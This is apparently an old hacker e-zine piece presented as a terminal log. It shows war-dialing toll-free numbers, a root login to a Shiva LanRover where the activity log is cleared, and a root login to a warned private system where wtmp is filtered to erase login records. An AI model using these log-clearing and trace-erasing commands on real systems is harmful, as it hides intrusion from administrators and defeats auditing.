@@ -1,0 +1,284 @@
+
+Key Pulse Issue 52
+Written by: Cuebiz
+BananaComm Logz.
+
+C:>cd bcom
+C:>dir|more
+ Volume in drive C has no label
+ Volume Serial Number is KEY-PULSE
+ Directory of C:\BCOM
+
+.            <DIR>         06-15-00   3:25a
+..           <DIR>         06-15-00   3:25a
+KP0DAY   ZIP           190 07-25-95   8:45p
+KPCRACK  EXE         3,581 07-27-95  12:48a
+MATRIX   SCR        25,358 11-16-96   4:10a
+ISSUE60  WRI           164 07-27-98   1:36p
+BCOM     COM         1,690 11-10-95   3:48a
+KPULSE   GIF        39,638 11-06-00  10:19a
+BCOM     INI            47 11-10-95   3:47a
+WHISK20   PL        86,129 11-12-00   2:39p
+|-more-|
+     80 file(s)      5,163,091 bytes
+                   6,998,978,432 bytes free
+C:>bcom
+
+   ** Welcome To BananaComm - Part of the Key Pulse Collection **
+
+*** Logs started; Saturday, October 28, 2000 2:01am
+
+NO CARRIER
+
+ATDT18002181204
+BUSY
+
+Disconnecting ...
+
+OK
+
+ATDT18002903609
+CONNECT 38400
+_
+
+Disconnecting ...
+
+OK
+
+ATDT18007894792
+CONNECT 38400
+ÿÿÿÿÿÿÿÿÿÿÿÿ˜K#Ààø>ÿÿÿÿÿÀàø>ÿåü……vUVeò|·ªð–ÚÈ†Ààø>ÿÀàø>ÿÀàø>ÿÀà
+
+Disconnecting ...
+
+OK
+
+ATDT18009599822
+CONNECT 38400
+_
+
+Disconnecting ...
+
+OK
+
+ATDT18002181204
+CONNECT 38400
+_
+
+Disconnecting ...
+
+OK
+
+ATDT18002520960
+CONNECT 38400
+Login:
+
+Disconnecting ...
+
+OK
+
+ATDT18002520962
+CONNECT 3800
+Login:
+
+Disconnecting ...
+
+OK
+
+ATDT18002603122
+CONNECT 38400
+_
+
+Disconnecting ...
+
+OK
+
+ATDT18007253512
+CONNECT 38400
+_
+
+Disconnecting ...
+
+OK
+
+ATDT18003624504
+CONNECT 38400
+
+ATDT18003624517
+CONNECT 38400
+—™þ¨Logon: —™þ¨Logon: 
+
+Disconnecting ...
+
+OK
+
+ATDT18003624550
+CONNECT 38400
+—™þ¨Logon: —™þ¨Logon: 
+
+Disconnecting ...
+
+OK
+
+ATDT18003624577
+CONNECT 57600
+_
+
+Disconnecting ...
+
+OK
+
+ATDT18003217468
+CONNECT 38400
+USERNAME:
+
+Disconnecting ...
+
+OK
+
+ATDT*private*
+CONNECT 38400
+wingate>open 166.122.66.2
+
+Trying 166.122.66.2...
+Connected to 166.122.66.2.
+Escape character is '^]'.
+>dial
+
+ATDT*private*
+CONNECT 2400
+@userid: root
+password:
+
+Shiva LanRover/E PLUS VROM Version 6.7 98/11/05
+LanRoverE_30D150# show users
+Line             User                     Activity  Idle/Limit    Up/Limit
+   1             root                        shell     0/   10     6/ None
+
+Total users: 1
+
+LanRoverE_30D150# ?
+alert                          Send text alert to all dial-in users
+busy-out line <number>         Busy-out serial line modem
+clear <keyword>                Reset part of the system
+comment                        Enter a comment into the log
+configure                      Enter a configuration session
+connect <port pool>            Connect to a shared serial port
+cping <IP host>                Send continuous ICMP echoes to IP host
+crashdump                      Write crashblock to log
+disable                        Disable privileges
+help                           List of available commands
+history                        List of previous commands
+initialize <keyword>           Reinitialize part of the system
+lan-to-lan <keyword>           Manage LAN-to-LAN connections
+passwd                         Change password
+ping <IP host>                 Send ICMP echo to IP host
+ppp                            Start a PPP session
+quit                           Quit from shell
+reboot                         Schedule reboot
+route <protocol>               Modify a protocol routing table
+rlogin <IP host>               Start an rlogin session
+show <keyword>                 Information commands, type "show ?" for list
+slip                           Start a SLIP session
+telnet <IP host>               Start a Telnet session
+--MORE--
+*FLUSHED*
+LanRoverE_30D150# show log
+
+Sun Oct 29 12:30:37 GMT 2000 1     [Shell] Activity log cleared
++00:02  2     Serial1: "root" logged out: user exit after 00:42 (Command Shell ) 
++00:06  3     Serial1: Rate 115200bps
++00:00  4     Serial1: Modem string 'AT&FW1&C1&D3&K3&Q5&S1%C3\N3S95=47S0=1&W'
++00:00  5     Serial1: Initialized modem
++02:55  6     setting time of day from timeserver to Sun Oct 29 12:33:39 GMT 2000
++10:21  7     Serial1: New Command Shell session
++00:00  8     Serial1: "root" logged in
+
+LanRoverE_30D150# clear log
+LanRoverE_30D150# quit
+Disconnecting and resetting line.
+>exit
+Disconnecting.
+
+NO CARRIER
+++ATH0
+OK
+
+ATDT*private*
+CONNECT 38400
+
+WARNING: This computer system is a private system for the use of authorized
+individuals ONLY. Any attempt at intrusion will be logged and reported to
+the proper authorites. Attempting to gain unauthorized access is a crime
+under Federal and Virginia state laws. VIOLATORS WILL BE PROSECUTED.
+
+Please be advised that use constitutes consent to monitoring 
+(Elec Comm Priv Act, 18 USC 2701-2711)
+
+If you do not have an account on this system, disconnect now by
+hitting CTRL-D or by dropping your terminal session.
+
+Key Pulse login: root
+Password:
+
+Last login: Sat Oct 28 06:13:53 from usr32-dialup225.
+*** WELCOME TO THE KEY PULSE SYSTEMS BEEYOTCH! ***
+You have mail.
+
+# cd /jfaith/.cUe/.w3rd/.cRasH/
+# ls
+
+cuebiz/               kpscan.pl             News/                                                                                             
+cuebot                lynx_bookmarks.html   kping.c*
+dead.letter           nmap/                 kpscan.c*
+elvis.mp3             mail/                 rock.bx
+ISSUE65               Mailbox               clair^bot
+hotel.txt             makaveli/             Saint/
+
+# kpmail                                                                            
+you have 1 new message
+display more?y
+
+From:slickrick [KP-mail hidden address activated]
+To:root [KP message auto-forward v2.1]
+Subject: Re: shit!
+Parts/Attachments:
+   1.1     OK     ~22 lines  Text
+   1.2.1   OK    ~79 lines  Text
+   1.2.2          2.3 KB     Image
+
+read message now?n
+# cat wtmp | grep -v "root" >> werd
+# mv werd wtmp
+# exit
+MoFo Leaving Key Pulse Systems....
+Connection closed.
+
+NO CARRIER
+++ATH0
+OK
+^x
+Exiting BananaComm - Part of the Key Pulse Collection.
+
+C:>fuck you
+Bad command or file name
+
+C:>i hate doing this shit!
+Bad command or file name
+
+C:>hahahahahahahahahahaha
+Bad command or file name
+
+C:>kpcrack
+Key Pulse - Secuirity Analasis Tool
+Entering interactive mode. . . .
+^C
+
+C:>fuck you fuck you fuck you duck fu duck fu luck poo 
+Bad command or file name
+   
+      NOTE: You MAY have a hard time viewing this file with PICO ;)
+- (C)opyWr0ng 2000-2001 Fixed up with MS-Edit, and Pr0grammers File Editor -
+  
+
+
